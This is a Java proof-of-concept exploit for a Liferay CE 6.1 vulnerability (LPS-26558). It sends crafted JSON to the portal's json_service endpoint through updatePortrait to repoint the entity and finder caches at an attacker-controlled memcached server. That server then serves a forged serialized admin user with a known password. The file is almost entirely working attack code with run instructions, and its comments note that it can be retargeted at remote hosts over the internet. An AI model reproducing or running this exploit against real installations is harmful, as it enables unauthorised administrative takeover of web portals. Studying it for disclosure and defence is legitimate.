import com.liferay.portal.cache.key.HashCodeCacheKeyGenerator;
import com.liferay.portal.kernel.cache.key.CacheKeyGenerator;
import com.liferay.portal.kernel.cache.key.CacheKeyGeneratorUtil;
import com.liferay.portal.kernel.dao.orm.EntityCache;
import com.liferay.portal.kernel.dao.orm.FinderCache;
import com.liferay.portal.kernel.dao.orm.FinderPath;
import com.liferay.portal.model.impl.UserCacheModel;
import com.liferay.portal.model.impl.UserImpl;
import com.thimbleware.jmemcached.*;
import com.thimbleware.jmemcached.storage.CacheStorage;
import com.thimbleware.jmemcached.storage.hash.ConcurrentLinkedHashMap;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.GetMethod;
import org.jboss.netty.buffer.ChannelBuffers;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.nio.charset.Charset;
import java.util.HashMap;
import java.util.Map;

/**
 * Crudely crafted proof of concept for the vulnerability described in
 * <a href="http://issues.liferay.com/browse/LPS-26558">LPS-26558</a> it targets the default liferay ce 6.1
 * distributable.
 *
 * To run it, download liferay ce 6.1 from  http://www.liferay.com/downloads/liferay-portal/available-releases,unzip it,
 * start it  and configure it with default settings. Then execute this program and follow the instructions in the
 * console. It should grant you administrative access as well as make your Liferay installation really really slow
 * (but i think that's a liferay bug)
 */
public class Main {

	private static final String NEW_TARGET_USER_EMAIL = "liferayattacker@host.nl";

	// these values are static and hardcoded to target the liferay admin user of the default liferay ce 6.1
	// distributable. You'd have to change them to target another server

	private static final String LIFERAY_HOST = "localhost";
	private static final int LIFERAY_PORT = 8080;


	private static UserCacheModel userCacheModel = new UserCacheModel();

	static {
			userCacheModel.companyId = 1L;
			userCacheModel.userId = 2L;
			userCacheModel.contactId = 3L;

			userCacheModel.screenName = "liferayattacker";
			userCacheModel.emailAddress = NEW_TARGET_USER_EMAIL;
			userCacheModel.agreedToTermsOfUse = true;
			userCacheModel.passwordEncrypted = true;
			userCacheModel.password = "JauGvtFJymypwcDV23yakTiN3qs="; // s3cr3t
			userCacheModel.digest = "whatever";
			userCacheModel.reminderQueryQuestion = "what-is-your-father's-middle-name";
			userCacheModel.reminderQueryAnswer = "brian";
			userCacheModel.languageId = "en_US";
			userCacheModel.firstName = "bobby";
			userCacheModel.lastName = "tables";
	}


	// host to which the memcached server we start up will listen to, should be a remote ip for an attack over
	// the internet

	private static final String MEMCACHE_SERVER_HOST = "localhost";
	private static final int MEMCACHE_SERVER_PORT = 5678;

	public static void main(String[] args) throws Exception {
		initializeUtils();
		startMemcacheServer();
		reconfigureLiferay();

		System.out.println("Go to http://" + LIFERAY_HOST + ":" + LIFERAY_PORT + "/c/portal/login");
		System.out.println("Log in as username " + NEW_TARGET_USER_EMAIL + " " +
				"and password s3cr3t then press enter in this console " +
				"and reload the page in your browser");

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));

		reader.readLine();

		System.out.println("No longer serving a fake user from the cache");

		MyCache.serveFakeUser = false;
	}

	private static void initializeUtils() {
		CacheKeyGeneratorUtil util = new CacheKeyGeneratorUtil();

		Map<String, CacheKeyGenerator> cacheKeyGenerators = new HashMap<String, CacheKeyGenerator>();
		cacheKeyGenerators.put(FinderCache.class.getName(), new HashCodeCacheKeyGenerator());
		cacheKeyGenerators.put(EntityCache.class.getName(), new HashCodeCacheKeyGenerator());

		util.setCacheKeyGenerators(cacheKeyGenerators);
	}

	private static void startMemcacheServer() {
		MemCacheDaemon<LocalCacheElement> daemon = new MemCacheDaemon<LocalCacheElement>();

		CacheStorage<Key, LocalCacheElement> storage = ConcurrentLinkedHashMap
				.create(ConcurrentLinkedHashMap.EvictionPolicy.FIFO, 1000, 10485760);

		Cache<LocalCacheElement> cache = new MyCache(new CacheImpl(storage));
		insertFakeFinderCacheResponse(cache);

		daemon.setCache(cache);
		daemon.setBinary(true);
		daemon.setAddr(new InetSocketAddress(MEMCACHE_SERVER_HOST, MEMCACHE_SERVER_PORT));
		daemon.setIdleTime(Integer.MAX_VALUE);
		daemon.setVerbose(true);
		daemon.start();
	}

	private static void insertFakeFinderCacheResponse(Cache<LocalCacheElement> cache) {
		// make the finder cache return TARGET_USER_USER_ID when UserPersistence.fetchByC_EA is invoked for our
		// email and company id this is needed or the login process will bypass the entity cache

		FinderPath finderPath = new FinderPath(true,
				true, UserImpl.class, UserImpl.class.getName(), "fetchByC_EA",
				new String[] { Long.class.getName(), String.class.getName() },
				1L | 8L);

		String key = "com.liferay.portal.kernel.dao.orm.FinderCache.com.liferay.portal.model.impl.UserImpl" +
				finderPath.encodeCacheKey(new Object[] { userCacheModel.companyId , NEW_TARGET_USER_EMAIL });

		LocalCacheElement element = new LocalCacheElement(
				new Key(ChannelBuffers.wrappedBuffer(key.getBytes())), 1, 0, 12l);
		element.setData(ChannelBuffers.wrappedBuffer(SerializationUtil.serialize(new Long(userCacheModel.userId))));

		cache.set(element);
	}

	private static void reconfigureLiferay() throws IOException {
		reconfigureEntityCache();
		reconfigureFinderCache();
	}

	private static void reconfigureFinderCache() throws IOException {

		String binaryConnectionFactory =
				"{" +
					"\"class\":\"net.spy.memcached.BinaryConnectionFactory\"" +
				"}";

		String memcachedClientFactory = String.format(
				"{" +
					"\"class\":\"com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory\"," +
					"\"connectionFactory\":" + binaryConnectionFactory + "," +
					"\"addresses\":[\"%s:%d\"]" +
				"}", MEMCACHE_SERVER_HOST, MEMCACHE_SERVER_PORT);

		String portalCacheManager =
				"{" +
					"\"class\":\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager\"," +
					"\"timeout\":20," +
					"\"timeoutTimeUnit\":\"SECONDS\"," +
					"\"memcachedClientPool\":" + memcachedClientFactory +
				"}";

		String multiVMPool =
				"{" +
					"\"class\":\"com.liferay.portal.cache.MultiVMPoolImpl\"," +
					"\"portalCacheManager\":" + portalCacheManager +
				"}";

		String finderCache = "{" +
					"\"class\":\"com.liferay.portal.dao.orm.common.FinderCacheImpl\"," +
					"\"multiVMPool\":" + multiVMPool +
				"}";

		String util = "{" +
					"\"class\":\"com.liferay.portal.kernel.dao.orm.FinderCacheUtil\"," +
					"\"finderCache\":" + finderCache +
				"}";

		UrlBuilder urlBuilder = UrlBuilder.createUrl(String.format("http://%s:%d/c/portal/json_service",
				LIFERAY_HOST, LIFERAY_PORT), Charset.forName("UTF-8"));

		urlBuilder.addParameter("serviceClassName", "com.liferay.portal.service.UserServiceUtil");
		urlBuilder.addParameter("serviceMethodName", "updatePortrait");
		urlBuilder.addParameter("serviceParameters", "[\"userId\",\"bytes\"]");
		urlBuilder.addParameter("userId", "1");
		urlBuilder.addParameter("bytes", util);

		HttpClient client = new HttpClient();
		GetMethod method = new GetMethod(urlBuilder.toString());

		try {
			client.executeMethod(method);
		} finally {
			method.releaseConnection();
		}
	}

	private static void reconfigureEntityCache() throws IOException {

		String binaryConnectionFactory = "{\"class\":\"net.spy.memcached.BinaryConnectionFactory\"}";

		String memcachedClientFactory = String.format(
				"{" +
					"\"class\":\"com.liferay.portal.cache.memcached.DefaultMemcachedClientFactory\"," +
					"\"connectionFactory\":" + binaryConnectionFactory +"," +
					"\"addresses\":[\"%s:%d\"]" +
				"}", MEMCACHE_SERVER_HOST, MEMCACHE_SERVER_PORT);

		String portalCacheManager =
				"{" +
					"\"class\":\"com.liferay.portal.cache.memcached.MemcachePortalCacheManager\"," +
					"\"timeout\":20," +
					"\"timeoutTimeUnit\":\"SECONDS\"," +
					"\"memcachedClientPool\":" + memcachedClientFactory +
				"}";

		String multiVMPool =
				"{" +
					"\"class\":\"com.liferay.portal.cache.MultiVMPoolImpl\"," +
					"\"portalCacheManager\":" + portalCacheManager +
				"}";

		String entityCache =
				"{" +
					"\"class\":\"com.liferay.portal.dao.orm.common.EntityCacheImpl\"," +
					"\"multiVMPool\":" + multiVMPool +
				"}";

		String util =
				"{" +
					"\"class\":\"com.liferay.portal.kernel.dao.orm.EntityCacheUtil\"," +
					"\"entityCache\":" + entityCache +
				"}";

		UrlBuilder urlBuilder = UrlBuilder.createUrl(String.format("http://%s:%d/c/portal/json_service",
				LIFERAY_HOST, LIFERAY_PORT), Charset.forName("UTF-8"));

		urlBuilder.addParameter("serviceClassName", "com.liferay.portal.service.UserServiceUtil");
		urlBuilder.addParameter("serviceMethodName", "updatePortrait");
		urlBuilder.addParameter("serviceParameters", "[\"userId\",\"bytes\"]");
		urlBuilder.addParameter("userId", "1");
		urlBuilder.addParameter("bytes", util);

		HttpClient client = new HttpClient();
		GetMethod method = new GetMethod(urlBuilder.toString());

		try {
			client.executeMethod(method);
		} finally {
			method.releaseConnection();
		}
	}


	static class MyCache extends CacheWrapper<LocalCacheElement> {

		public static volatile boolean serveFakeUser = true;

		private byte[] fakeUserBytes;

		MyCache(Cache<LocalCacheElement> delegate) {
			super(delegate);
			fakeUserBytes = SerializationUtil.serialize(userCacheModel);
		}

		@Override
		public LocalCacheElement[] get(Key... keys) {

			LocalCacheElement[] result = super.get(keys);

			boolean anyNonNull = false;

			for (int i = 0; i < result.length; i++) {
				String keyAsString = new String(keys[i].bytes.toByteBuffer().array());

				// In typical Liferay fashion the memcached implementation is buggy and actually does not work
				// This is because EntityCacheImpl's toString method does not return something unique
				// So just return the same fake user for every user. crude but it will work

				if (serveFakeUser && keyAsString.startsWith("com.liferay.portal.kernel.dao.orm.EntityCache." +
						"com.liferay.portal.model.impl.UserImplcom.liferay.portal.dao.orm.common.EntityCacheImpl")) {
					LocalCacheElement element = new LocalCacheElement(keys[i],1, 0, 12l);
					element.setData(ChannelBuffers.wrappedBuffer(fakeUserBytes));

					result[i] = element;
				}

				LocalCacheElement value = result[i];

				if (value != null) {
					anyNonNull = true;
				}
			}

			// workaround for another liferay bug, in EntityCacheImpl they actually make the most basic of java
			// programming errors. They compare strings with identity comparison , eg : result == StringPool.BLANK
			// causing it  to want to deserialize an empty string so return null instead.

			if (!anyNonNull) {
				return null;
			}
			return result;
		}

	}


}
